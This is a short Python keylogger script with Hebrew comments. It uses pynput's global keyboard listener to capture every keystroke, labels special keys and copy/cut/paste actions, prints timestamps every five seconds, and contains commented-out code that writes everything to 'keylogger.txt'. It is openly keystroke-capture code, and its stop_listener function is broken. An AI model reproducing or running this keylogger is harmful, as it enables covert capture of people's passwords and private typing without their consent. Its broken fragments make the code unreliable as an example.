

#ספריית תאריך
import datetime
#ספריית זמן
import time


#מאזין גלובלי למקלדת, מתוך פינפוט
from pynput.keyboard import Listener
#הרצה של קודים במקביל
import threading




##########
#חלק ראשון שמדפיס זמן ! :


def time_print():
   while True:
       now = datetime.datetime.now()
       timestamp = "***" + now.strftime("%Y-%m-%d %H:%M:%S") + "***\n"
       #הפרינט הבא מיועד למנוע דחיפה קדימה של התאריך על יד הדפסות קודמות שממלאות את השורה
       print()
       #הדפסת התאריך
       print(timestamp)
       #מנגנון שמגדיר כל כמה שניות לתת תאריך
       time.sleep(5)


       # הגדרת פתיחת קובץ של מנדי
       # with open('keylogger.txt', 'a') as file:
       #     file.write(timestamp)
       # time.sleep(60)


# הפקודה שמפעילה את תהליך רישום זמן ותאריך, כל כמה שניות
play = threading.Thread(target=time_print, daemon=True)
play.start()












#######
#                      ''' חלק שני שעוקב אחרי ההקשות ! :'''


#פונקציה שיודעת לקבל את תיעוד ההקשות מליסנר, (ולתקן, ולערוך קצת- את מה שזקוק לתיקון)
def keylogger(key):
   key = str(key).replace("'", "")


   special_keys = {
       'Key.space': ' ',
       'Key.enter': '\n',
       'Key.up': '',
       'Key.right': ' ',
       'Key.left': '',
       'Key.down': '\n',
       'Key.ctrl_l': '<ctrl >',
       '\\x03': '<copy >',
       'Key.backspace': '',
       '\\x18': '<cut >',
       '\\x16': '<paste >'
   }


   key = special_keys.get(key, key)


   if not key.isalpha() or key.isnumeric():
       key = ' {0} '.format(key)
   print(key,end="")


   #הגדרת השמה לקובץ, של מנדי
   # with open('keylogger.txt', 'a') as file:
   #     file.write(key)


def stop_listener(on_pres):
   pressed_keys=()
   pressed_keys.add


# פקודת תחילת תהליך האזנה למקלדת
with Listener(on_press=keylogger) as listener:
   Last_key=()


   listener.join()


